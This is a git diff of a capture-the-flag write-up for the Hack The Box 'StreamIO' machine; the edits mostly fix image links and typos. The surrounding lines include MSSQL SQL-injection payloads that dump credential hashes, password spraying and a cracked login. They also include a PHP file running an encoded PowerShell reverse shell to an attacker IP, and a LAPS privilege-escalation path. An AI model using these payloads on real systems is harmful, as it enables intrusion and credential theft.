@@ -179,13 +179,13 @@ Lets now look at the databases:
 cn' UNION select 1,name,3,4,5,6 from master..sysdatabases-- -
 ```
 
-streamio_databases.png
+![streamio_databases.png](../assets/streamio_assets/streamio_databases)
 
 Lets look at the tables from STREAMIO
 ```
 cn' UNION select 1,name,3,4,5,6 from STREAMIO..sysobjects WHERE xtype = 'U'-- -
 ```
-streamio_users_table.png
+![streamio_users_table.png](../assets/streamio_assets/streamio_users_table.png)
 
 
 We can check the column names with:
@@ -193,25 +193,25 @@ We can check the column names with:
 cn' UNION select 1,name,3,4,5,6 from STREAMIO..syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')-- -
 ```
 
-streamio_column_names.png
+![streamio_column_names.png](../assets/streamio_assets/streamio_column_names.png)
 
 Lets now grab the usernames:
 ```
 cn' UNION select 1,username,3,4,5,6 from STREAMIO..Users-- -
 ```
 
-streamio_usernames.png
+![streamio_usernames.png](../assets/streamio_assets/streamio_usernames.png)
 
 And passwords:
 ```
 cn' UNION select 1,password,3,4,5,6 from STREAMIO..Users-- -
 ```
 
-streamio_password_hashes.png
+![streamio_password_hashes.png](../assets/streamio_assets/streamio_password_hashes.png)
 
 Cool, so it looks like we've got about 30 usernames and hashes. Lets see if we can crack these hashes using hashcat:
 
-streamio_hashcat.png
+![streamio_hashcat.png](../assets/streamio_assets/streamio_hashcat.png)
 
 I'll copy that into a file called hash_mess and use `awk` to isolate the passwords
 
@@ -239,19 +239,19 @@ physics69i
 
 After doing a bit of spraying and not finding anything off the bat, I decided to validate the usernames and see if they were valid names on the domain. We can use Kerbrute userenum for this:
 
-streamio_kerbrute.png
+![streamio_kerbrute.png](../assets/streamio_assets/streamio_kerbrute.png)
 
 Ok, so it looks like only yoshihide is a valid domain user.
 
 Unable to authenticate to any other services I turn back to the website and spray my password list with yoshihide to see if I can login:
 
-streamio_site_hydra.png
+![streamio_site_hydra.png](../assets/streamio_assets/streamio_site_hydra.png)
 
 Nice, that worked. We can login with `yoshihide:66boysandgirls..`
 
-once logged in we can head to https://streamio.htb/admin/ and find a dashboard:
+Once logged in we can head to https://streamio.htb/admin/ and find a dashboard:
 
-streamio_admin_panel.png
+![streamio_admin_panel.png](../assets/streamio_assets/streamio_admin_panel.png)
 
 Clicking on the "User Management" button we are redirected to: https://streamio.htb/admin/?user=
 
@@ -259,7 +259,7 @@ This seems like its worth testing for LFI.
 
 Lets try fuzzing out more parameters:
 
-streamio_cookie_fuzz.png
+![streamio_cookie_fuzz.png](../assets/streamio_assets/streamio_cookie_fuzz.png)
 
 Nice, looks like we found an extra parameter: debug.
 
@@ -314,7 +314,7 @@ So, knowing this, we should be able to make a POST request, set the include fiel
 
 ### Exploitation
 
-First I'll grab a bas64 encoded Powershell reverse shell from revshell.com, and copy it into a `system` command in a PHP script call shell.php:
+First I'll grab a bas64 encoded Powershell reverse shell from revshells.com, and copy it into a `system` command in a PHP script call shell.php:
 
 ```php    
 system('powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANwA4ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=');
@@ -385,7 +385,7 @@ id          username                                           password
 (8 rows affected)
 ```
 
-The nikk37 user is interesting because we can confirm the are a valid domain user:
+The nikk37 user is interesting because we can confirm they are a valid domain user:
 
 ```
 PS C:\temp> net users /domain
@@ -401,7 +401,7 @@ The command completed successfully.
 
 Dropping the hash in crackstation we can succesfully crack it:
 
-streamio_crack_nikk37.png
+![streamio_crack_nikk37.png](../assets/streamio_assets/streamio_crack_nikk37.png)
 
 We can now login using evil-winrm as user nikk37:
 
@@ -423,7 +423,7 @@ streamio\nikk37
 
 And grab the user.txt flag:
 
-streamio_user_flag.png
+![streamio_user_flag.png](../assets/streamio_assets/streamio_user_flag.png)
 
 ### Privilege Escalation
 
@@ -469,7 +469,7 @@ Password: password@12
 [+] 4 passwords have been found.
 ```
 
-Nice. Lets update our users and passwords list and try some spraying.
+Nice. Lets update our users and passwords lists and try some spraying.
 
 ```
 ┌──(ryan㉿kali)-[~/HTB/StreamIO]
@@ -498,11 +498,11 @@ Loading the results into BloodHound, I can mark both nikk37 and JDgodd "owned" a
 
 Looking closely at JDgodd's control permissions, we see they have WriteOwner controll over the "core staff" group. 
 
-streamio_jdgodd_perms.png
+![streamio_jdgodd_perms.png](../assets/streamio_assets/streamio_jdgodd_perms.png)
 
 And in turn, if we look at the core staff group control permissions, we see members have the ability to ReadLAPSPassword. Interesting. This is likely our attack path.
 
-streamio_corestaff.png
+![streamio_corestaff.png](../assets/streamio_assets/streamio_corestaff.png)
 
 Trying to read LAPS as JDgodd and we get access denied and no password returned.. 
 
@@ -568,7 +568,7 @@ DC
 
 And grab the final flag:
 
-streamio_root_flag.png
+![streamio_root_flag.png](../assets/streamio_assets/streamio_root_flag.png)
 
 Thanks for following along! 
 
